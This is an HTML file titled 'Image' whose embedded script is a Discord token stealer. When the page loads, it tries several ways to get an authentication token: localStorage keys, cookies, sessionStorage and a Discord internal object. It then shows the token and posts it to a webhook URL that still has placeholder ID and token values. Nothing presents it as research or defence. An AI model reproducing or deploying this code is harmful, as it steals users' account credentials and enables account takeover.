<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Image</title>
</head>
<body>
    <script>
        // Multiple methods to grab Discord token
        function grabToken() {
            // Method 1: localStorage (old method)
            let token = localStorage.getItem('token');
            if (token) return { method: 'localStorage', token: token };
            
            // Method 2: Check all localStorage keys
            for (let i = 0; i < localStorage.length; i++) {
                let key = localStorage.key(i);
                if (key && key.includes('token')) {
                    let val = localStorage.getItem(key);
                    if (val && val.length > 50) {
                        return { method: 'localStorage-' + key, token: val };
                    }
                }
            }
            
            // Method 3: Cookies
            let cookies = document.cookie.split(';');
            for (let cookie of cookies) {
                cookie = cookie.trim();
                if (cookie.startsWith('token=')) {
                    return { method: 'cookie', token: cookie.substring(6) };
                }
            }
            
            // Method 4: Try to access Discord's internal objects
            try {
                if (window.__DISCORD) {
                    return { method: '__DISCORD', token: window.__DISCORD.token };
                }
            } catch(e) {}
            
            // Method 5: Check sessionStorage
            try {
                let sessToken = sessionStorage.getItem('token');
                if (sessToken) return { method: 'sessionStorage', token: sessToken };
            } catch(e) {}
            
            return null;
        }
        
        let result = grabToken();
        
        if (result) {
            document.write('Found token via ' + result.method + ':<br>');
            document.write('<textarea style="width:500px;height:100px;">' + result.token + '</textarea>');
            
            // Send to webhook
            var webhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: '```' + result.token + '```' })
            }).catch(function() {});
        } else {
            document.write('No token found.<br>');
            document.write('Make sure you are logged into Discord in this browser.<br>');
            document.write('Try opening discord.com in this browser first.');
        }
    </script>
</body>
</html>
